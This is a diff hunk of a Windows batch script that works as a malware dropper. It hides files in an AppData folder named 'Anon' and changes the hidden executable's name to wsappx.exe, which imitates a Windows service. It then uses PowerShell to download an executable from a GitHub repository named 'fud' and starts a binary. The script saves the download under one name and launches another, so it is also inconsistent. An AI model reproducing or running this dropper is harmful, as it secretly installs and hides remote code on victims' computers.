@@ -31,7 +31,7 @@ if '%errorlevel%' NEQ '0' (
 
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Runtime.exe" /s /d
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\wsappx.exe" /s /d
 Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Runtime.exe' -OutFile wsappx.exe"
 start Runtime.exe
 cd C:\Windows\System32\Runtime
